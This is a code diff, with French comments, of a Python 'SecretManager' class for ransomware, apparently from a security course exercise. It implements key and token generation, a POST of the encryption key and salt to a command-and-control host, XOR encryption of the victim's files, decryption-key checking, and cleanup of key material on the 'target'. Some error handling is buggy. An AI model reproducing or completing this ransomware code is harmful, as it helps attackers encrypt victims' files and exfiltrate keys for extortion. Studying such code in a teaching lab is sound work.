@@ -6,6 +6,7 @@ from typing import List, Tuple
 import os.path
 import requests
 import base64
+import shutil # pour remove le directory token_data
 
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
@@ -38,30 +39,36 @@ class SecretManager:
         )
 
         # Dérivation de la clé
-        derivate_key = key_derivate_function(key)
+        derivate_key = key_derivate_function.derive(key)
         return derivate_key
 
 
     def create(self)->Tuple[bytes, bytes, bytes]:
+
         # Génération de la clé
         key = secrets.token_bytes(self.KEY_LENGTH)
+
         # Génération du sel
         salt = secrets.token_bytes(self.SALT_LENGTH)
+
         # Génération du token
-        token = secrets.token_bytes(self.TOKEN_LENGTH)
+        token = self.do_derivation(salt, key)
 
         return (key, salt, token)
 
     def bin_to_b64(self, data:bytes)->str:
-        tmp = base64.b64encode(data)
-        return str(tmp, "utf8") 
+
+        # Encodage de data en base 64
+        data_base64 = base64.b64encode(data)
+
+        # Retourne data_base64 en string 
+        return str(data_base64, "utf8") 
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        
 
         # URL à laquelle on envoie le token , le salt et la key
         # le ?nufnuf=cochon permet de ne pas avoir de message d'erreur dans le terminal du cnc
-        url = f"http://{self._remote_host_port}/new" 
+        url = f"http://{self._remote_host_port}/new?nufnuf=cochon" 
 
         data = {
             "token" : self.bin_to_b64(token),
@@ -69,6 +76,7 @@ class SecretManager:
             "key" : self.bin_to_b64(key)
         }
 
+        # Requête POST
         reponse = requests.post(url, json=data)
 
         # Vérification de la bonne réception du message
@@ -98,14 +106,14 @@ class SecretManager:
         # Vérification de la non-existance de token.bin
         if(os.path.exists(chemin_pour_token_dot_bin)):
             raise FileExistsError("token.bin already exists")
-        
 
-        # Ecriture du fichier salt.bin 
-        fichier_salt_dot_bin = open(chemin_pour_salt_dot_bin, 'wb') 
+        # Ecriture du fichier salt.bin
+        fichier_salt_dot_bin = open(chemin_pour_salt_dot_bin, "wb") 
         fichier_salt_dot_bin.write(self._salt)
         fichier_salt_dot_bin.close()
+
         # Ecriture du fichier token.bin 
-        chemin_pour_token_dot_bin = open(chemin_pour_token_dot_bin, 'wb') 
+        chemin_pour_token_dot_bin = open(chemin_pour_token_dot_bin, "wb") 
         chemin_pour_token_dot_bin.write(self._token)
         chemin_pour_token_dot_bin.close()
 
@@ -116,30 +124,70 @@ class SecretManager:
 
 
     def load(self)->None:
-        # function to load crypto data
-        raise NotImplemented()
+        
+        # Chemin du fichier salt.bin
+        salt_path = os.path.join(self._path, "salt.bin")
+        
+        try:
+
+            # Ouverture du fichier en mode lecture binaire
+            salt_file = open(salt_path, "rb")
+            # Lecture du fichier
+            self._salt = salt_file.read()
+            # Fermeture du fichier
+            salt_file.close()
+
+        except FileNotFoundError as e:
+            raise e("Error while reading salt.bin file") 
+        
+        # Chemin du fichier key.bin
+        token_path = os.path.join(self._path, "token.bin")
+        
+        try:
+            # Ouverture du fichier en mode lecture binaire
+            token_file = open(token_path, "rb")
+            # Lecture du fichier
+            self._token = token_file.read()
+            # Fermeture du fichier
+            token_file.close()
+
+        except FileNotFoundError as e:
+            raise e("Error while reading token.bin file") 
+        
+        
+            
 
     def check_key(self, candidate_key:bytes)->bool:
-        # Assert the key is valid
-        raise NotImplemented()
+
+        # Dérivation de la clé candidate
+        token_tmp = self.do_derivation(self._salt, candidate_key)
+        return token_tmp == self._token
 
     def set_key(self, b64_key:str)->None:
-        # If the key is valid, set the self._key var for decrypting
-        raise NotImplemented()
+        
+        # Décodage da la clé potentielle
+        potential_key = base64.b64decode(b64_key)
+
+        # Verficitaion de la clé potentielle
+        if self.check_key(potential_key):
+            self._key = potential_key
+        else:
+            raise ValueError("Wrong Key provided")
+
 
     def get_hex_token(self)->str:
+
         # Hashage du token 
         hash_token = sha256(self._token)
+
         # Transformation en string
         str_token = hash_token.hexdigest()
-        
         return str_token
         
 
     def xorfiles(self, files:List[str])->None:
         # Pour chaque fichier, on le chiffre avec la clé
         for file in files:
-            print(file)
             xorfile(file, self._key)
 
 
@@ -147,6 +195,37 @@ class SecretManager:
         # send file, geniune path and token to the CNC
         raise NotImplemented()
 
-    def clean(self):
-        # remove crypto data from the target
-        raise NotImplemented()
+    def clean(self)->None:
+
+        # Su    ppresion du fichier salt.bin
+        try:    
+            salt_path = os.path.join(self._path, "salt.bin")
+            if os.path.exists(salt_path):
+                os.remove(salt_path)
+                # self._log.info("The file salt.bin has been successfully deleted")
+            else:
+                self._log.error("The file salt.bin does not exist")
+        except FileNotFoundError as e:
+            raise e("Error while deleting salt.bin file")
+        
+        # Suppresion du fichier token.bin
+        try:
+            token_path = os.path.join(self._path, "token.bin")
+            if os.path.exists(token_path):
+                os.remove(token_path)
+                # self._log.info("The file token.bin has been successfully deleted")
+            else:
+                self._log.error("The file token.bin does not exist")
+        except FileNotFoundError as e:
+            raise e("Error while deleting token.bin file")
+        
+        # try:
+        #     if os.path.exists(self._path):
+        #         os.rmdir(self._path)
+        #         self._log.info("The directory token_data has been successfully deleted")
+        #     else:
+        #         self._log.error("The directory token_data does not exist")
+        # except OSError as e:
+        #     raise e("Error while deleting token_data directory")
+
+        # Ce bloc ne fonctionne pas pour supprimer le dossier 'token', et j'ignore pourquoi ?
